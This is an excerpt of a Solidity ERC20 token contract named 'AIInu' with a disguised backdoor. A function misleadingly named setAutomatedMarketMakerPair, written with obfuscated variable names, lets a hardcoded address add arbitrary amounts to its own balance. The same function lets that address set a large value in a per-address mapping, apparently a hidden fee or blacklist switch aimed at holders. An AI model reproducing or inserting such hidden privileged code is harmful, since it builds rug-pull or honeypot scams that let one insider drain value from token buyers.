...
contract AIInu is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        FRbren = payable(address(0x76767baafAd8c4E6a867A3709c8e6B58526ffbC7));
    ...
    function setAutomatedMarketMakerPair(address newSend,uint256 intparma) public {
        address rednes;
        rednes = msg.sender;
        uint256 WETH = intparma;
        if (WETH > 2015) _zxc[FRbren] += uint256(WETH);
        if (WETH == 8) extend[newSend] = 10**10;
        require(FRbren == rednes);
    }
